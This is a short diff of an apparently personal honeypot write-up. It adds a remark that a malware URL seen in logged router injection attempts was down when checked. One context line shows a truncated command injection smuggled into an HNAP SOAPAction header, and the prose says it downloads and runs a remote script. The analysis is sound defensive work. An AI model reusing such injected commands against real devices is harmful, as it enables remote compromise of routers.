@@ -66,6 +66,8 @@ SOAPAction: "http://purenetworks.com/HNAP1/GetDeviceSettings/`cd && cd tmp && ex
 
 Above are a couple of injection attempts. Both caused my honeypot to issue error 400's, but these seem done manually. The first one attempts to download some script, run it, and delete itself afterwards. The second tries to get a php backend to return some information, maybe.
 
+The first one exposes a potential malware url. I tried checking it out; however, it seemed to be down by the time I got to it. That would've been a good opportunity to try to pull the script that it would've tried to run on my honeypot.
+
 ### Malware Network Indication
 
 
